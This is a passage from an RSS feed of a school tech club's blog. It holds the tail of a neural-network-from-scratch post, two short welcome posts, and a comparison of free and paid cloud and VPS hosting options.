loss (8000/10000): 0.001
loss (9000/10000): 0.001
loss (10000/10000): 0.001
</code></pre>
<p>Voila! We have officially programmed Neural Networks from scratch. Pat yourself on the back for reading through this. And of course, if you bothered to code this out, try porting it over to different languages like Java, JS or even C (yikes why would <a href="https://github.com/terminalai/neuralC">anyone</a> subjects themselves to that?).</p>
<p>In the next part, it is time for the actual hard part. Good luck!</p>
<h2 id="references">References</h2>
<p>A lot of people think I just collated a bunch of sources and rephrased, and honestly I walked into writing this thinking I would be doing just that. The problem is that many sources who have attempted to do this, only cover the single to multi-perceptron layer case and not the multi to multi-perceptron case. Which is pretty sad. The true math is hidden behind mountains of research papers that loosely connect to give the results of this blogpot which I am too incomponent to connect by myself. So, I just did the math myself. (The math may not be presented in this way but it works so it should be correct) Yes, it was a bit crazy, and it destroyed me to my core. This was a great character building moment for me. So these are the actual sources:</p>
<ul>
<li><a href="https://numpy.org/">https://numpy.org/</a></li>
<li><a href="https://en.wikipedia.org/wiki/Gradient_descent">https://en.wikipedia.org/wiki/Gradient_descent</a></li>
<li><a href="https://en.wikipedia.org/wiki/Matrix_calculus">https://en.wikipedia.org/wiki/Matrix_calculus</a></li>
<li><a href="https://en.wikipedia.org/wiki/Tensor_calculus">https://en.wikipedia.org/wiki/Tensor_calculus</a></li>
<li><a href="https://en.wikipedia.org/wiki/Ricci_calculus">https://en.wikipedia.org/wiki/Ricci_calculus</a></li>
<li><a href="https://en.wikipedia.org/wiki/XNOR_gate">https://en.wikipedia.org/wiki/XNOR_gate</a></li>
<li>CS5131 Notes (Special thanks to Mr Chua and Mr Ng)</li>
</ul>
<hr>

<p>(Excruciatingly edited by Prannaya)</p>
]]></description><link>https://nush.app/blog/2022/05/26/cnn-from-scratch-1</link><guid isPermaLink="true">https://nush.app/blog/2022/05/26/cnn-from-scratch-1</guid><dc:creator><![CDATA[zayan]]></dc:creator><pubDate>Thu, 26 May 2022 00:00:00 GMT</pubDate></item><item><title><![CDATA[Hello CTF!]]></title><description><![CDATA[<p>Sorry to disappoint- this is another hello world post. You can scroll past now :)</p>
]]></description><link>https://nush.app/blog/2021/11/18/hello-ctf</link><guid isPermaLink="true">https://nush.app/blog/2021/11/18/hello-ctf</guid><dc:creator><![CDATA[lyc]]></dc:creator><pubDate>Thu, 18 Nov 2021 00:00:00 GMT</pubDate></item><item><title><![CDATA[Hello World!]]></title><description><![CDATA[<p>As per tradition, to celebrate the launch of the AppVenture Website featuring this shiny new blog (finally, after bursts of development over the year), we&#39;ll have:</p>
<pre><code class="language-javascript">console.log(&quot;Hello, World!&quot;);
</code></pre>
<p>Jokes aside, while we don&#39;t have a fixed posting schedule presently, here are things you can expect: write-ups after our CTF events, medium-style articles by our members on the latest tech news, reflections and sharings on projects, or even musings from interesting experiences and events we hold for the school and community.</p>
<p>Now, if you&#39;re curious why this is a thing: my motivation for redesigning the AppVenture website (again) was because I hoped to make something that&#39;s simpler and maintainable in the future. I actually thought the original website in Go was really nice, but because AppVenture is moving to TypeScript and Vue, it&#39;ll be difficult to get people who can continue to maintain in the long term. I didn&#39;t like the next version in Nuxt.js, however, because with the little content we had, setting up a database felt overkill. It also meant more annoying backups than just copying a git repository around. And, that&#39;s how we ended up with Gridsome.</p>
<p>Since we&#39;re going to redesign the site, I thought it&#39;ll be a good chance to include more than just a project showcase. For an interest group, a blog seemed like a great chance for members to share about any cool things they may be up to. Especially with the new stuff launched this year, such as the cybersecurity division and monthly sharings. Of course, I can&#39;t predict how the future of this will go though, since it&#39;ll launch after I graduate. But, I&#39;m pretty optimistic about it.</p>
<p>If you&#39;re interested in this blog, stay tuned for more!</p>
<p>(Psst: If you&#39;re a nushie interested to write something or simply cross-post your articles here, feel free to <a href="/contact">contact us</a>)</p>
]]></description><link>https://nush.app/blog/2021/11/18/hello-world</link><guid isPermaLink="true">https://nush.app/blog/2021/11/18/hello-world</guid><dc:creator><![CDATA[lyc]]></dc:creator><pubDate>Thu, 18 Nov 2021 00:00:00 GMT</pubDate></item><item><title><![CDATA[Picking the Right Cloud Service Provider  (and Getting a Free VPS)]]></title><description><![CDATA[<p>If you&#39;ve had to look for an online host for:</p>
<ul>
<li>A static/dynamic website</li>
<li>A backend API</li>
<li>Miscellaneous self-hosted services like <a href="https://nextcloud.com/">Nextcloud</a>, <a href="https://wallabag.org/en">Wallabag</a>, <a href="https://airsonic.github.io/">AirSonic</a> etc.</li>
<li>Compute (Simulations, AI)</li>
<li>Running a botnet</li>
</ul>
<p>or other usecases, then it can be hard to choose which service to use, especially for the thinking self-hoster wishing optimize their productivity. In fact, here is the list of cloud services I&#39;ll be covering in this post alone.</p>
<p><strong>Static webhosts</strong></p>
<ul>
<li>Vercel</li>
<li>Netlify</li>
<li>Surge.sh</li>
<li>Github pages (+ Github actions)</li>
</ul>
<p><strong>Big Cloud</strong></p>
<ul>
<li>Amazon Web Services (AWS)</li>
<li>Google Cloud Products (GCP)</li>
<li>Oracle Cloud</li>
</ul>
<p><strong>Independent  Virtual Private Server (VPS) Providers</strong> </p>
<ul>
<li>DigitalOcean</li>
<li>Linode</li>
<li>Vultr</li>
</ul>
<p>Thus, in this guide, I&#39;ll share some of my experiences with these products and my humble evaluation of performance, cost, and the strings attached. But first, let&#39;s find you your very own server for free.</p>
<h1 id="vps-free-tiers">VPS Free Tiers</h1>
<h2 id="oracle-vm-instance">Oracle VM instance</h2>
<p>Oracle, a company which has racked up many sins, has made amends and bestows users 200GB boot volumes, 24GB RAM, 4 Oracle CPU server instances on its cloud platform. Well technically, due to supposed resource limitations in their Singaporean datacentres, it will play coy and may or may not allow you to max out some of the limits. Oh and you don&#39;t need to connect a credit card unlike every other cloud provider.</p>
<p>To setup your own server, login to your oracle cloud dashboard and click on <strong>Create a VM instance</strong> under Launch Resources. Choose the <strong>Ampere series</strong> under in the <strong>Image and Shape</strong> menu, make sure to save the private key for SSH and check <strong>Specify a custom boot volume size</strong> and set an amount as close to 200GB as it will allow. Note that in order to host stuff over the internet, <a href="https://stackoverflow.com/a/64053781/13367211">you have to open your ports by configuring ingress routes on the Oracle cloud interface and also configure the firewall on the server itself.</a></p>
<h2 id="digitalocean">DigitalOcean</h2>
<p>Although not as good of a deal as Oracle&#39;s, through the GitHub student pack you can redeem $100 of DigitalOcean credits which last indefinitely, unlike the &quot;$100 for 3 months&quot; offers available by scouring for referral links online. With the <a href="https://www.digitalocean.com/try/new-pricing">updated pricing</a> (billing is per hour), this will get you a 1GB server for 16 months or a 2GB server for 8 months.  Alternatively, if you just want to blow it on compute resources (max. 8GB unless you request for 16GB or the specialized droplets), then you might as well just use referral links.</p>
<p><img src="./dg.png" alt="DigitalOcean pricing"></p>
<h1 id="other-vps-services">Other VPS services</h1>
<h2 id="linode--vultr">Linode &amp; Vultr</h2>
<p>Up until the recent pricing updates to DigitalOcean, DigitalOcean, Linode and Vultr have had near-identical pricing where there wasn&#39;t much different between the three for their lower end servers; maybe Vultr has a bit more options. But now, only Linode and Vultr retain the classic $5-a-month droplet, and they consistently beat digitalocean by pricepoint for each of the basic tier options.</p>
<p><strong>Linode Pricing</strong></p>
<p><img src="./linode.png" alt="Linode Pricing"></p>
<p><strong>Vultr Pricing</strong></p>
<p><img src="./vultr.png" alt="Vultr Pricing"></p>
<p>Linode and Vultr also offer a greater variety of specialized server options like those focused on memory or CPU or ones with special processors. If you are going to pay for a VPS, might as well pick either of these.</p>
<h3 id="pricing-summary">Pricing Summary</h3>
<ul>
<li><a href="https://www.digitalocean.com/try/new-pricing">DigitalOcean</a></li>
<li><a href="https://www.linode.com/pricing/">Linode</a></li>
<li><a href="https://www.vultr.com/pricing/">Vultr</a></li>
</ul>
<h2 id="gcp">GCP</h2>
<p>GCP stands out with its generous 90-day $300USD ($400SGD) free trial, and is very flexible in the resource, specs and processors you can allocate. But even with the credits, GPUs are only available on request. This may make GCP seem great amazing for compute but first its time for a tale of horror.</p>
<h3 id="curse-of-the-gcp-throttle">Curse of the GCP throttle</h3>
<p>I had a projected where I needed to run some CPU-intensive physics simulations. My team was on a tight schedule with the deadline in only a few days and we output from a few thousand runs of the simulation. First, we ran it on a GCP instance with 24 E2 processors, with every other relevant setting maxed out. But while a single run on a regular computer would take 2m5s for 1 run and 5m21s for 12 runs with multithreading, only 100 runs were completed in 10 hours overnight on the GCP instance. Maybe its cause as Google put it, &quot;E2s fire in bursts&quot; so we tried 8 C2s then 8 N1s instead, but it didn&#39;t help. The following graph shows the peak in CPU usage when the script running the simulation is first started, and how CPU goes to zero and stays there after a while.</p>
<p><img src="./cpuusage.png" alt="GCP CPU Usage"></p>
<p>In the end, a humble 8GB digitalocean server finished 1.3k runs in 13 hours. A fair improvement.</p>
<h2 id="aws">AWS</h2>
<p>While AWS is widely used by enterprises, I&#39;d suggest towards looking at alternatives if they exist for your usecase as:</p>
<ul>
<li>It is easy to get accidental charges and wake up with a hefty bill since you need to connect a credit card.</li>
<li>Free tier options aren&#39;t that great and usually have better alternatives elsewhere.</li>
<li>Much more expensive than its competitors.</li>
</ul>
<p>However, AWS lambda (and maybe some other niche products) is pretty good and has a generous free tier so its cool in my book.</p>
<h1 id="usecase">Usecase</h1>
<p>To summarize, we will now go over some specific usecases.</p>
<h2 id="static-web-hosting">Static Web hosting</h2>
<blockquote>
<p>I want to host a static (generated) website.</p>
</blockquote>
<p>If you have a simple HTML5 site you want to quickly deploy, then surge.sh is a service that allows you to quickly host it with a domain like <code>victorious-drain.surge.sh</code>. </p>
<p>For anything more than that, there&#39;s either hosting it on Github Pages or a service like Vercel or Netlify. Github Pages has neat features like extended support for Jekyll apps (which are pretty cool) and even statically generated website (e.g. Hugo, Next.js apps) can be hosted on Github Pages using community-made Github Actions. Github Pages domains are also less shady. But there are some minor annoyances like the interface being rudimentary and thus it can be hard to troubleshoot issues with custom domain names or building a project properly.</p>
<p>Netlify and Vercel is also quick to use and are more full-fledged hosting services. All you have to do is link your Github repository and it will take care of parsing the web framework, building and deploying. Vercel domains look like <code>custom-name.vercel.app</code> while netlify domains look like <code>custom-name.netlify.app</code>. Vercel also has site analytics which Netlify locks behind a steep paywall.</p>
<p>tl;dr Use Vercel</p>
<h2 id="self-hosted-utilities--backend-api">Self-hosted utilities &amp; Backend API</h2>
<blockquote>
<p>I want to self-host services like file-hosting, media servers, or run a backend API like a discord bot.</p>
</blockquote>
<p>Use a free Oracle cloud server. Next.</p>
<h2 id="compute-cpu">Compute (CPU)</h2>
<blockquote>
<p>I want to run a CPU intensive simulation for a few days.</p>
</blockquote>
<p>Find referral links online for DigitalOcean (90-day $100), Linode (60-day $100 credit) or Vultr (30-day $100) servers or just use your Oracle Cloud server.</p>
<h1 id="epilogue-why-bother">Epilogue: Why bother?</h1>
<p>Leveraging cloud services and exploiting the generosity of crazy big cloud providers lends itself well to the spirit of hacker culture, that is to say, the DIY ethic and finding creative or elaborate solutions to minor inconveniences. I&#39;ve tried hooking up my Wolfram Mathematica client to cloud compute server with Wolfram Language, or using <a href="https://sourceforge.net/projects/xming/">xming</a> to interface with COMSOL hosted somewhere else (this didn&#39;t work). I could stay and preach the value and satisfaction of self-hosting but I&#39;ll save it for another post. If you have anything you&#39;d like to share regarding your experiences with cloud hosting, message me on discord at <code>meecrob/hash/8207</code> or be sure to share it in the AppVenture server. </p>
]]></description><link>https://nush.app/blog/2022/06/16/picking-the-right-cloud-service</link><guid isPermaLink="true">https://nush.app/blog/2022/06/16/picking-the-right-cloud-service</guid><dc:creator><![CDATA[vishalk]]></dc:creator><pubDate>Thu, 16 Jun 2022 00:00:00 GMT</pubDate></item></channel></rss>